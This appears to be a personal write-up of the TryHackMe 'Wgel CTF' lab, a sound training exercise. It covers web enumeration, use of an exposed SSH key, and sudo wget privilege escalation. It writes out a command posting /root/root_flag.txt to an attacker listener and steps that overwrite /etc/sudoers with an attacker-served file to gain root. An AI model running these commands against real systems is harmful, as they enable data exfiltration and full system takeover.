
2024-07-01 16:46

Source: #tryhackme 

Tags: [[Privilege Escalation]] 

### HTTP

at port 80 Apache is running
on seeing the source code we see a comment that suggests a possible user on the server 
#### Dirbuster 

1. run gobuster on `http://<ip>`
2. we find /sitemap
3. run gobuster again on `http://<ip>/sitemap`
4. we find `.ssh` private `rsa` key of the user found in the source code
### SSH 

1. copy the content of the key to a file
2. run `chmod 600 file` to give the file appropriate permissions
3. login via [[ssh]] as the user found in the source code, using the file as a private key (use -i to specify key)
### Privilege Escalation 

1. `sudo -l `works and tells us we can run `wget` with `sudo`
2. `gtfobins` has a exploit of file upload for wget
3. start listening using `nc` on port 9000 in a new terminal
4. according to `gtfobins` we craft an attack to directly get the root flag- 
```
sudo wget --post-file=/root/root_flag.txt http://<Attackbox IP>:9000
```
### Root Shell

1. `gtfobin` has exploits listed for file upload/download/read of `wget`
2. To get a shell with admin privileges we first get the file using the same way as with the flag, we edit the `sudoers` file locally by adding our own settings for the user.`/etc/sudoers`
```
#jessie  ALL=(root) NOPASSWD: /usr/bin/wget
jessie  ALL=(ALL) NOPASSWD: ALL
```
3. we raise a server with python3 in the path where our `sudoers` file is .
4. And in the wgel machine we execute the `wget`(to get the new `sudoers` file from our device to the wgel machine) command with `sudo` which will overwrite the `/etc/sudoers`. **We locate ourselves in the folder of `/etc/`** and execute:
```
sudo /usr/bin/wget <Attackbox IP>/sudoers --output-document=sudoers
```
5. then run `sudo su`



### References
[TryHackMe | Wgel CTF](https://tryhackme.com/r/room/wgelctf)